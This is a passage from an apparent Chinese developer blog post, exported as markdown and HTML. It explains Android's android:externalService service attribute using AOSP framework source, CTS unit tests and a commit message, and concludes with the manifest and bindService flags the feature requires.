code！想不到吧？\n先给出源码地址：https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice\n其实这是CTS测试用到的单元测试代码，我们可以从单元测试项来看看有哪些重要的注意点。\n这里具体只需要关注 [service/AndroidManifest.xml](https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/service/AndroidManifest.xml) 和 [src/ExternalServiceTest.java](https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/src/android/externalservice/cts/ExternalServiceTest.java) 这两个文件即可。\n\n从单元测试的Manifest中我们可以了解到几种主要的失败情况：\n1、没有把exported设成true：\n\n```xml\n<service android:name=\".ExternalNonExportedService\"\n         android:isolatedProcess=\"true\"\n         android:externalService=\"true\"\n         android:exported=\"false\"/>\n```\n\n就对应这个错误用例：\n\n```java\n/** Tests that BIND_EXTERNAL_SERVICE requires that an externalService be exported. */\npublic void testFailBindExternalNonExported() {\n    Intent intent = new Intent();\n    intent.setComponent(\n            new ComponentName(sServicePackage, sServicePackage+\".ExternalNonExportedService\"));\n    try {\n        getContext().bindService(intent, mConnection,\n                Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);\n        fail(\"Should not be able to BIND_EXTERNAL_SERVICE to non-exported service\");\n    } catch (SecurityException e) {\n    }\n}\n```\n\n**所以，exported也要同时设成true才行。**\n2、没有把isolatedProcess设成true：\n\n```xml\n<service android:name=\".ExternalNonIsolatedService\"\n         android:isolatedProcess=\"false\"\n         android:externalService=\"true\"\n         android:exported=\"true\"/>\n```\n\n就对应此错误：\n\n```java\n/** Tests that BIND_EXTERNAL_SERVICE requires the service be an isolatedProcess. */\npublic void testFailBindExternalNonIsolated() {\n    ...\n        fail(\"Should not be able to BIND_EXTERNAL_SERVICE to non-isolated service\");\n    ...\n}\n```\n\n3、**没有用BIND_EXTERNAL_SERVICE进行绑定也是不行的**：\n\n```java\n/** Tests that an externalService can only be bound with BIND_EXTERNAL_SERVICE. */\npublic void testFailBindWithoutBindExternal() {\n    Intent intent = new Intent();\n    intent.setComponent(new ComponentName(sServicePackage, sServicePackage+\".ExternalService\"));\n    try {\n        getContext().bindService(intent, mConnection, Context.BIND_AUTO_CREATE);\n        fail(\"Should not be able to bind to an external service without BIND_EXTERNAL_SERVICE\");\n    } catch (SecurityException e) {\n    }\n}\n```\n\n因此，最后正确的用法必须是这样声明：\n\n```xml\n<service\n    android:name=\".XXXService\"\n    android:exported=\"true\"\n    android:externalService=\"true\"\n    android:isolatedProcess=\"true\" />\n```\n\n同时通过：\n\n```java\nbindService(intent, mConnection, Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);\n```\n\n进行绑定，BIND_EXTERNAL_SERVICE是必须，其余flag根据自己需要决定。\n\n## 后话\n\n我专门搜了下AOSP的代码提交记录，发现这个功能3年前就开发好了，链接如下：\nhttps://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/\nCommit信息：\n\n```\nAdd external services, a way to run isolated processes as a different package.\n\nThis adds android:externalService boolean attribute to <service>. If that\nattribute is true, then bindService() may be called with\nBIND_EXTERNAL_SERVICE to create the new service process under the calling\npackage's name and uid. The service will execute the code from the package in\nwhich it is declared, but will appear to run as the calling application.\n\nExternal services may only be used if android:exported=\"false\" and\nandroid:isolatedProcess=\"true\".\n\nBug: 22084679\nBug: 21643067\nChange-Id: I3c3a5f0ef58738316c5efeab9044e43e09220d01\n```\n\n改动也不多，就这么几个文件：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190410235236156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n其中最重要的逻辑就在ActiveServices当中，很长的方法，此处只保留关键新增部分：\n\n```java\nprivate ServiceLookupResult retrieveServiceLocked(Intent service,\n        String resolvedType, String callingPackage, int callingPid, int callingUid, int userId,\n        boolean createIfNeeded, boolean callingFromFg, boolean isBindExternal,\n        boolean allowInstant) {\n    ServiceRecord r = null;\n    ...\n            ComponentName name = new ComponentName(\n                    sInfo.applicationInfo.packageName, sInfo.name);\n            if ((sInfo.flags & ServiceInfo.FLAG_EXTERNAL_SERVICE) != 0) { // 先验证flag，即对应externalService属性是否为true\n                if (isBindExternal) { // isBindExternal表示是否是通过BIND_EXTERNAL_SERVICE绑定服务\n                    if (!sInfo.exported) {\n                    \t// 你看，exported必须也是true，否则直接丢你一脸异常\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                                \" is not exported\");\n                    }\n                    if ((sInfo.flags & ServiceInfo.FLAG_ISOLATED_PROCESS) == 0) {\n                    \t// isolatedProcess也必须true\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                                \" is not an isolatedProcess\");\n                    }\n                    // Run the service under the calling package's application.\n                    // （这里是源码注释，即下面的代码就是如何让调用方App拥有这个外置Service）\n                    ApplicationInfo aInfo = AppGlobals.getPackageManager().getApplicationInfo(\n                            callingPackage, ActivityManagerService.STOCK_PM_FLAGS, userId);\n                    if (aInfo == null) {\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" +\n                                \"could not resolve client package \" + callingPackage);\n                    }\n                    // 其实就是重新设置了一遍ServiceInfo，让此Service改名换姓\n                    sInfo = new ServiceInfo(sInfo);\n                    sInfo.applicationInfo = new ApplicationInfo(sInfo.applicationInfo);\n                    sInfo.applicationInfo.packageName = aInfo.packageName;\n                    sInfo.applicationInfo.uid = aInfo.uid;\n                    name = new ComponentName(aInfo.packageName, name.getClassName());\n                    service.setComponent(name);\n                } else {\n                    throw new SecurityException(\"BIND_EXTERNAL_SERVICE required for \" +\n                            name);\n                }\n            } else if (isBindExternal) {\n                throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                        \" is not an externalService\");\n            }\n\t...\n}\n```\n","slug":"源码茶舍之android-externalService是什么属性？实现原理？","published":1,"updated":"2024-03-25T07:31:25.853Z","comments":1,"photos":[],"link":"","_id":"cluaufh0j000othe6grf208r6","content":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a>发现</h2><p>在AndroidManifest中声明Service时，偶然发现一个布尔类型的属性：<code>android:externalService</code><br>示例如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">...</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果minSDK小于24，会显示警告，很显然这是一个24以后的新东西。<br>先顾名思义一下，external的service，外置（外挂）的服务？它和 <code>android:exported</code> 以及 <code>android:isolatedProcess</code> 属性是什么关系？</p>\n<h2 id=\"初探\"><a href=\"#初探\" class=\"headerlink\" title=\"初探\"></a>初探</h2><p>先谷歌一下，再百度一下，无果。竟然没有一个人解释这是什么东西，这更加激发了我的好奇心。<br>马上去Android官网搜，搜到service标签的文档，心中窃喜：<br><a href=\"https://developer.android.com/guide/topics/manifest/service-element\">https://developer.android.com/guide/topics/manifest/service-element</a><br>翻完整个文档，发现居然也没有 <code>android:externalService</code> 的说明，难道是太新了忘了补充文档吗？<br>不过我们可以从中先复习一下 <code>android:exported</code> 以及 <code>android:isolatedProcess</code> 属性：</p>\n<h5 id=\"exported\"><a href=\"#exported\" class=\"headerlink\" title=\"exported\"></a>exported</h5><blockquote>\n<p>Whether or not components of other applications can invoke the service or interact with it — “true” if they can, and “false” if not. When the value is “false”, only components of the same application or applications with the same user ID can start the service or bind to it.<br>The default value depends on whether the service contains intent filters. The absence of any filters means that it can be invoked only by specifying its exact class name. This implies that the service is intended only for application-internal use (since others would not know the class name). So in this case, the default value is “false”. On the other hand, the presence of at least one filter implies that the service is intended for external use, so the default value is “true”.<br>This attribute is not the only way to limit the exposure of a service to other applications. You can also use a permission to limit the external entities that can interact with the service (see the <a href=\"https://developer.android.com/guide/topics/manifest/service-element.html#prmsn\">permission</a> attribute).</p>\n</blockquote>\n<p>其实这个属性大家也是耳熟能详了，从官网解释来看，主要就是限制该Service能否被其他应用调用。<br>同时，还特意解释了默认值的决定情况，即你不需要总是显式地声明此属性。</p>\n<ul>\n<li>如果service标签下没有添加任何intent-filter，那么就默认为false，即不对外暴露，因为这种情况下其他应用不知道你的Service类名，当然就只能内部调用了（我觉得谷歌这个解释有点牵强，因为即便你知道包名和类名，但exported为false的话，你也调不了）</li>\n<li>如果添加了至少一个能让外部调用的filter标签（比如action什么的），那么默认值就是true了。</li>\n</ul>\n<p>最后，还提醒了此属性不是唯一一种限制外部调用的途径，permission也可以。</p>\n<h5 id=\"isolatedProcess\"><a href=\"#isolatedProcess\" class=\"headerlink\" title=\"isolatedProcess\"></a>isolatedProcess</h5><blockquote>\n<p>If set to true, this service will run under a special process that is isolated from the rest of the system and has no permissions of its own. The only communication with it is through the Service API (binding and starting).</p>\n</blockquote>\n<p>这个比较简单，顾名思义也知道是让Service独立运行到一个特定进程中。</p>\n<h2 id=\"挖掘\"><a href=\"#挖掘\" class=\"headerlink\" title=\"挖掘\"></a>挖掘</h2><p>既然搜也搜不到，官网也藏着掖着，那就只能我们自己挖掘了。这怎么少得了Read the fucking code呢？<br>这就要从系统启动App并解析Manifest文件开始说起了，我们只简要地分析一下：<br>1、SystemServer进程启动<strong>PackageManagerService</strong>（PMS）服务；<br>2、PMS扫描文件目录的过程，会调用到<strong>scanPackageLI</strong>方法，此方法中会实例化<strong>PackageParser</strong>，这是关键；<br>3、PackageParser会解析Manifest中的各种标签，其中<strong>parseService</strong>便是解析service的。</p>\n<p>来看看parseService方法的代码，长得一匹，得精简一下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> Service <span class=\"title function_\">parseService</span><span class=\"params\">(Package owner, Resources res,</span></span><br><span class=\"line\"><span class=\"params\">        XmlResourceParser parser, <span class=\"type\">int</span> flags, String[] outError,</span></span><br><span class=\"line\"><span class=\"params\">        CachedComponentArgs cachedArgs)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> XmlPullParserException, IOException &#123;</span><br><span class=\"line\">    <span class=\"type\">TypedArray</span> <span class=\"variable\">sa</span> <span class=\"operator\">=</span> res.obtainAttributes(parser,</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService);</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">Service</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Service</span>(cachedArgs.mServiceArgs, <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>());</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// exported的解析</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">setExported</span> <span class=\"operator\">=</span> sa.hasValue(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_exported);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (setExported) &#123;</span><br><span class=\"line\">        s.info.exported = sa.getBoolean(</span><br><span class=\"line\">                com.android.internal.R.styleable.AndroidManifestService_exported, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    s.info.flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// isolatedProcess的解析</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sa.getBoolean(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_isolatedProcess,</span><br><span class=\"line\">            <span class=\"literal\">false</span>)) &#123;</span><br><span class=\"line\">        s.info.flags |= ServiceInfo.FLAG_ISOLATED_PROCESS;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// externalService的解析看这里！</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sa.getBoolean(</span><br><span class=\"line\">            com.android.internal.R.styleable.AndroidManifestService_externalService,</span><br><span class=\"line\">            <span class=\"literal\">false</span>)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 等我们去看看这个FLAG的注释就知道是干啥的了</span></span><br><span class=\"line\">        s.info.flags |= ServiceInfo.FLAG_EXTERNAL_SERVICE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    sa.recycle();</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">outerDepth</span> <span class=\"operator\">=</span> parser.getDepth();</span><br><span class=\"line\">    <span class=\"type\">int</span> type;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((type=parser.next()) != XmlPullParser.END_DOCUMENT</span><br><span class=\"line\">           &amp;&amp; (type != XmlPullParser.END_TAG</span><br><span class=\"line\">                   || parser.getDepth() &gt; outerDepth)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (parser.getName().equals(<span class=\"string\">&quot;intent-filter&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">ServiceIntentInfo</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceIntentInfo</span>(s);</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            s.intents.add(intent); <span class=\"comment\">// 注意这里的intents集合</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (parser.getName().equals(<span class=\"string\">&quot;meta-data&quot;</span>)) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!setExported) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这儿有个小发现，正好验证了我们上述的官方文档复习</span></span><br><span class=\"line\">        <span class=\"comment\">// 若开发者没有显式地设置exported属性，且intent-filter标签数量大于0时，exported自动就赋值为true了</span></span><br><span class=\"line\">        s.info.exported = s.intents.size() &gt; <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接着我打开了ServiceInfo文件，总算是找到了官方解释：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Bit in &#123;<span class=\"doctag\">@link</span> #flags&#125;: If set, the service can be bound and run in the</span></span><br><span class=\"line\"><span class=\"comment\"> * calling application&#x27;s package, rather than the package in which it is</span></span><br><span class=\"line\"><span class=\"comment\"> * declared.  Set from &#123;<span class=\"doctag\">@link</span> android.R.attr#externalService&#125; attribute.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">FLAG_EXTERNAL_SERVICE</span> <span class=\"operator\">=</span> <span class=\"number\">0x0004</span>;</span><br></pre></td></tr></table></figure>\n\n<p>顺便，我发现Context源码中也新增了一个bindService的flag：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Flag for &#123;<span class=\"doctag\">@link</span> #bindService&#125;: The service being bound is an</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> android.R.attr#isolatedProcess isolated&#125;,</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> android.R.attr#externalService external&#125; service.  This binds the service into the</span></span><br><span class=\"line\"><span class=\"comment\"> * calling application&#x27;s package, rather than the package in which the service is declared.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * When using this flag, the code for the service being bound will execute under the calling</span></span><br><span class=\"line\"><span class=\"comment\"> * application&#x27;s package name and user ID.  Because the service must be an isolated process,</span></span><br><span class=\"line\"><span class=\"comment\"> * it will not have direct access to the application&#x27;s data, though.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * The purpose of this flag is to allow applications to provide services that are attributed</span></span><br><span class=\"line\"><span class=\"comment\"> * to the app using the service, rather than the application providing the service.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">BIND_EXTERNAL_SERVICE</span> <span class=\"operator\">=</span> <span class=\"number\">0x80000000</span>;</span><br></pre></td></tr></table></figure>\n\n<p>结合这俩来看，就非常明白了。稍作总结一下：<br>1、声明externalService为true就是让该Service可以绑定并运行在调用方的App中，而不是在声明这个Service的App中，这和我们最开始猜测的外置服务之意相符；<br>2、注释还进一步说明，此Service还同时须要设置isolatedProcess为true；<br>3、此Service的业务代码会在调用方App的包名环境下执行，因为它已经是独立进程（isolated process）了，从声明它的App那儿离家出走，改名换姓；<br>4、当然，此Service不能直接访问调用方App的数据；<br>5、目的是想从概念上分离Service提供方和使用方这二者（这是我个人理解）。</p>\n<h2 id=\"再挖\"><a href=\"#再挖\" class=\"headerlink\" title=\"再挖\"></a>再挖</h2><p>经过上述初步挖掘，我们算是搞清楚了externalService这个属性的含义和作用，但依然有一些疑惑。比如：<br>具体使用一定要带BIND_EXTERNAL_SERVICE这个flag吗？<br>只把isolatedProcess和externalService设为true就能用了吗？</p>\n<p>要解决这些疑惑，有两个办法，一是自己去尝试，二是再次Read the fucking code！想不到吧？<br>先给出源码地址：<a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice\">https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice</a><br>其实这是CTS测试用到的单元测试代码，我们可以从单元测试项来看看有哪些重要的注意点。<br>这里具体只需要关注 <a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/service/AndroidManifest.xml\">service&#x2F;AndroidManifest.xml</a> 和 <a href=\"https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/src/android/externalservice/cts/ExternalServiceTest.java\">src&#x2F;ExternalServiceTest.java</a> 这两个文件即可。</p>\n<p>从单元测试的Manifest中我们可以了解到几种主要的失败情况：<br>1、没有把exported设成true：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.ExternalNonExportedService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>就对应这个错误用例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that BIND_EXTERNAL_SERVICE requires that an externalService be exported. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindExternalNonExported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.setComponent(</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(sServicePackage, sServicePackage+<span class=\"string\">&quot;.ExternalNonExportedService&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        getContext().bindService(intent, mConnection,</span><br><span class=\"line\">                Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to BIND_EXTERNAL_SERVICE to non-exported service&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (SecurityException e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>所以，exported也要同时设成true才行。</strong><br>2、没有把isolatedProcess设成true：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.ExternalNonIsolatedService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;false&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>就对应此错误：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that BIND_EXTERNAL_SERVICE requires the service be an isolatedProcess. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindExternalNonIsolated</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to BIND_EXTERNAL_SERVICE to non-isolated service&quot;</span>);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3、<strong>没有用BIND_EXTERNAL_SERVICE进行绑定也是不行的</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that an externalService can only be bound with BIND_EXTERNAL_SERVICE. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindWithoutBindExternal</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.setComponent(<span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(sServicePackage, sServicePackage+<span class=\"string\">&quot;.ExternalService&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        getContext().bindService(intent, mConnection, Context.BIND_AUTO_CREATE);</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to bind to an external service without BIND_EXTERNAL_SERVICE&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (SecurityException e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，最后正确的用法必须是这样声明：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.XXXService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>同时通过：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindService(intent, mConnection, Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);</span><br></pre></td></tr></table></figure>\n\n<p>进行绑定，BIND_EXTERNAL_SERVICE是必须，其余flag根据自己需要决定。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>我专门搜了下AOSP的代码提交记录，发现这个功能3年前就开发好了，链接如下：<br><a 